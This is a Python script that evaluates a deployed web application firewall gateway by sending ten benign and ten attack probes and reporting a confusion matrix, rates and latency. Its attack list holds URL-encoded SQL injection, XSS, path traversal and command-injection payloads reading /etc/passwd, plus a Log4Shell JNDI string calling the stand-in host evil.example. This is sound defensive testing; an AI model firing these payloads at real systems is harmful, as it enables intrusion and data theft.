#!/usr/bin/env python3
"""Labelled end-to-end enforcement check through a deployed NATRIX gateway.

Sends benign probes first, then attack probes, through the public gateway URL
and reports the confusion matrix, rates, and latency.  This is a policy check
on a small labelled probe set, not a generalisation estimate; the CSIC replay
and cross-validation files remain the model-accuracy evidence.

Usage:

    python experiments/scripts/live_attack_suite.py
    python experiments/scripts/live_attack_suite.py --url https://host/p/slug --key <admin key>
"""

from __future__ import annotations

import argparse
import json
import os
import statistics
import time
import urllib.error
import urllib.request
from datetime import datetime, timezone
from pathlib import Path

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120 Safari/537.36"

# Benign first: an attack can trip adaptive IP blocking, which would then
# contaminate the false-positive measurement.
BENIGN = [
    ("benign_home", "/", "portfolio homepage"),
    ("benign_utm", "/?utm_source=linkedin&utm_medium=social", "campaign query"),
    ("benign_projects", "/projects", "SPA route (origin 404 is still allowed)"),
    ("benign_about", "/about", "SPA route (origin 404 is still allowed)"),
    ("benign_js", "/assets/index-D1hhdjVN.js", "production JS bundle"),
    ("benign_css", "/assets/index-CKq5S0Fg.css", "production CSS bundle"),
    ("benign_search", "/?q=react", "ordinary search"),
    ("benign_page", "/?page=2&sort=recent", "pagination"),
    ("benign_apostrophe", "/?q=O%27Reilly", "surname with apostrophe"),
    ("benign_email", "/?email=nameet%40example.com", "email parameter"),
]

ATTACKS = [
    ("sqli_union", "/?id=1%27%20UNION%20SELECT%20username%2Cpassword%20FROM%20users--", "SQL injection"),
    ("sqli_or", "/?user=admin%27%20OR%20%271%27%3D%271", "SQL injection"),
    ("xss_script", "/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E", "reflected XSS"),
    ("xss_svg", "/?name=%3Csvg%2Fonload%3Dalert(1)%3E", "XSS that evaded the rules"),
    ("traversal", "/?file=..%2F..%2F..%2Fetc%2Fpasswd", "path traversal"),
    ("cmd_injection", "/?cmd=%3Bcat%20%2Fetc%2Fpasswd", "command injection"),
    ("null_byte", "/?file=index.php%00.jpg", "null-byte extension bypass"),
    ("double_encoded", "/?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd", "double-encoded traversal"),
    ("scanner_path", "/wp-admin/setup-config.php", "vulnerability scanner"),
    ("log4shell", "/?q=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D", "JNDI lookup"),
]


def fetch(url: str, headers: dict, timeout: int = 45) -> tuple[int, bytes, float]:
    started = time.perf_counter()
    request = urllib.request.Request(url, headers=headers)
    try:
        with urllib.request.urlopen(request, timeout=timeout) as response:
            body = response.read()
            status = response.status
    except urllib.error.HTTPError as error:
        body = error.read()
        status = error.code
    except Exception:  # network failure, timeout, TLS
        body = b""
        status = 0
    return status, body, (time.perf_counter() - started) * 1000.0


def title_of(body: bytes) -> str:
    text = body.decode("utf-8", "replace")
    start = text.find("<title>")
    end = text.find("</title>", start + 1)
    return text[start + 7:end].strip() if start >= 0 and end > start else ""


def percentile(values: list[float], p: float) -> float | None:
    if not values:
        return None
    ordered = sorted(values)
    index = min(len(ordered) - 1, max(0, int(round((p / 100.0) * len(ordered) + 0.5)) - 1))
    return round(ordered[index], 1)


def run_case(base: str, case_id: str, path: str, note: str, expected: str, delay: float) -> dict:
    status, body, latency = fetch(base + path, {"User-Agent": UA, "Accept": "text/html,*/*"})
    time.sleep(delay)
    return {
        "id": case_id,
        "path": path,
        "note": note,
        "expected": expected,
        "status": status,
        "blocked": status in (403, 429),
        "latency_ms": round(latency, 1),
        "bytes": len(body),
        "title": title_of(body),
    }


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", default="https://natrix-security-engine.onrender.com/p/nameetahire-vercel-app")
    parser.add_argument("--admin-url", default="https://natrix-security-engine.onrender.com")
    parser.add_argument("--key", default=os.environ.get("NATRIX_ADMIN_KEY", ""))
    parser.add_argument("--delay", type=float, default=0.4)
    parser.add_argument("--out", default="experiments/results/live_gate/live_attack_suite")
    args = parser.parse_args()

    base = args.url.rstrip("/")
    admin = args.admin_url.rstrip("/")
    admin_headers = {"X-Natrix-Admin-Key": args.key} if args.key else {}

    stats_before = None
    if args.key:
        status, body, _ = fetch(f"{admin}/api/gate/stats", admin_headers)
        if status == 200:
            stats_before = json.loads(body)

    print(f"NATRIX live enforcement check — {base}\n")
    rows = []
    for case_id, path, note in BENIGN:
        row = run_case(base, case_id, path, note, "benign", args.delay)
        rows.append(row)
        print(f"  {row['status']:>3}  {case_id:18s} {note}")
    for case_id, path, note in ATTACKS:
        row = run_case(base, case_id, path, note, "attack", args.delay)
        rows.append(row)
        print(f"  {row['status']:>3}  {case_id:18s} {note}")

    tp = sum(1 for r in rows if r["expected"] == "attack" and r["blocked"])
    fn = sum(1 for r in rows if r["expected"] == "attack" and not r["blocked"])
    fp = sum(1 for r in rows if r["expected"] == "benign" and r["blocked"])
    tn = sum(1 for r in rows if r["expected"] == "benign" and not r["blocked"])
    total = len(rows)
    accuracy = (tp + tn) / total if total else 0.0
    precision = tp / (tp + fp) if tp + fp else 0.0
    recall = tp / (tp + fn) if tp + fn else 0.0
    f1 = 2 * precision * recall / (precision + recall) if precision + recall else 0.0
    fpr = fp / (fp + tn) if fp + tn else 0.0
    fnr = fn / (fn + tp) if fn + tp else 0.0
    benign_latency = [r["latency_ms"] for r in rows if r["expected"] == "benign" and r["status"]]
    attack_latency = [r["latency_ms"] for r in rows if r["expected"] == "attack" and r["status"]]

    home = next(r for r in rows if r["id"] == "benign_home")
    origin_ok = "Nameet" in home["title"]
    stats_after = None
    decisions = []
    if args.key:
        status, body, _ = fetch(f"{admin}/api/gate/stats", admin_headers)
        if status == 200:
            stats_after = json.loads(body)
        status, body, _ = fetch(f"{admin}/api/gate/decisions?limit=100", admin_headers)
        if status == 200:
            decisions = json.loads(body).get("decisions") or []

    metrics = {
        "probes": total,
        "tp": tp, "fp": fp, "tn": tn, "fn": fn,
        "accuracy": round(accuracy, 4),
        "precision": round(precision, 4),
        "recall": round(recall, 4),
        "f1": round(f1, 4),
        "false_positive_rate": round(fpr, 4),
        "false_negative_rate": round(fnr, 4),
        "benign_latency_ms": {
            "p50": percentile(benign_latency, 50), "p95": percentile(benign_latency, 95),
        },
        "attack_latency_ms": {
            "p50": percentile(attack_latency, 50), "p95": percentile(attack_latency, 95),
        },
    }
    result = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "gateway_url": base,
        "user_agent": UA,
        "origin_rendered": origin_ok,
        "home_title": home["title"],
        "metrics": metrics,
        "cases": rows,
        "gate_stats_before": stats_before,
        "gate_stats_after": stats_after,
        "recent_gate_decisions": decisions,
        "note": "Labelled live policy check on a small probe set; not a generalisation estimate.",
    }

    out = Path(args.out)
    out.parent.mkdir(parents=True, exist_ok=True)
    out.with_suffix(".json").write_text(json.dumps(result, indent=2), encoding="utf-8")

    lines = [
        "# Live enforcement check",
        "",
        f"- Generated: `{result['generated_at']}`",
        f"- Gateway: `{base}`",
        f"- Origin rendered the portfolio: **{origin_ok}** (`{home['title']}`)",
        "",
        "## Confusion matrix (labelled probes)",
        "",
        "| | Blocked | Allowed |",
        "|---|---|---|",
        f"| Attack | {tp} (TP) | {fn} (FN) |",
        f"| Benign | {fp} (FP) | {tn} (TN) |",
        "",
        "| Metric | Value |",
        "|---|---|",
        f"| Accuracy | {metrics['accuracy']} |",
        f"| Precision | {metrics['precision']} |",
        f"| Recall | {metrics['recall']} |",
        f"| F1 | {metrics['f1']} |",
        f"| False-positive rate | {metrics['false_positive_rate']} |",
        f"| False-negative rate | {metrics['false_negative_rate']} |",
        f"| Benign latency p50 / p95 | {metrics['benign_latency_ms']['p50']} / {metrics['benign_latency_ms']['p95']} ms |",
        f"| Attack latency p50 / p95 | {metrics['attack_latency_ms']['p50']} / {metrics['attack_latency_ms']['p95']} ms |",
        "",
        "## Probes",
        "",
        "| Probe | Expected | Status | Blocked | Latency | Note |",
        "|---|---|---|---|---|---|",
    ]
    for row in rows:
        lines.append(
            f"| `{row['id']}` | {row['expected']} | {row['status']} | "
            f"{'yes' if row['blocked'] else 'no'} | {row['latency_ms']} ms | {row['note']} |"
        )
    if stats_after:
        lines += [
            "",
            "## Deployed gate",
            "",
            f"- Contract: `{stats_after.get('contract')}` ({stats_after.get('feature_count')}-D), "
            f"available: **{stats_after.get('available')}**",
            f"- Decisions: {stats_after.get('decisions')}, enforced blocks: {stats_after.get('enforced_blocks')}",
            f"- Inference p50 / p95 / p99: {stats_after.get('latency_ms', {}).get('p50')} / "
            f"{stats_after.get('latency_ms', {}).get('p95')} / {stats_after.get('latency_ms', {}).get('p99')} ms",
        ]
    lines += ["", f"> {result['note']}", ""]
    out.with_suffix(".md").write_text("\n".join(lines), encoding="utf-8")

    print("\nConfusion matrix: "
          f"TP={tp} FP={fp} TN={tn} FN={fn}")
    print(f"Accuracy={accuracy:.4f} Precision={precision:.4f} "
          f"Recall={recall:.4f} F1={f1:.4f} FPR={fpr:.4f}")
    print(f"Origin rendered the portfolio: {origin_ok}")
    print(f"Wrote {out.with_suffix('.json')} and {out.with_suffix('.md')}")
    if not args.key:
        print("No --key: gate counters and persisted decisions were not read.")

    raise SystemExit(0 if origin_ok and fn == 0 and fp == 0 else 1)


if __name__ == "__main__":
    main()
